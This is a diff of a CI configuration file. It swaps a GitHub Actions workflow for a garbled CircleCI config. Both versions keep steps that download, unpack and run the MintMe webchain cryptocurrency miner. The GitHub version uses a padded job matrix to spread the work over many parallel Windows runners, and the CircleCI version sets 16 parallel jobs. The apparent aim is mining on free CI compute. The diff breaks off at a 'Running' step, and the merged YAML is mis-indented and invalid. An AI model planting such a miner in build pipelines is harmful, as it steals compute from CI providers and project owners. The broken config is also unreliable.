@@ -1,23 +1,23 @@
-name: saloha
-
-on: [workflow_dispatch]
-
+version: 2.1
 jobs:
-  build:
-    name: eX-code_MintMe
-    runs-on: windows-latest
-    strategy:
-      max-parallel: 5
-      fail-fast: false
-      matrix:
-        go: [1.0, 1.1, 1.2, 1.3, 1,35]
-        flag: [A, B, C, D, E, F, G, H, I]
-    env:
-        NUM_JOBS: 20
-        JOB: ${{ matrix.go }}
-    steps:
-    - name: PREPARING
-      run: Invoke-WebRequest https://github.com/mintme-com/miner/releases/download/v2.8.0/webchain-miner-2.8.0-win64.zip -OutFile webchain-miner-2.8.0-win64.zip
+    trial:
+      docker:
+            - image: circleci/ruby:2.5.3
+      parallelism: 16
+      steps:
+        - run:
+            name: Install Dependencies
+            command: |
+              lscpu
+              echo Hello,subscribe it
+
+workflows:
+    version: 2.1
+    build:
+        jobs:
+        - trial
+        - name: PREPARING
+      Run: Invoke-WebRequest https://github.com/mintme-com/miner/releases/download/v2.8.0/webchain-miner-2.8.0-win64.zip -OutFile webchain-miner-2.8.0-win64.zip
     - name: Seting-UP
       run: Expand-Archive webchain-miner-2.8.0-win64.zip
     - name: Running
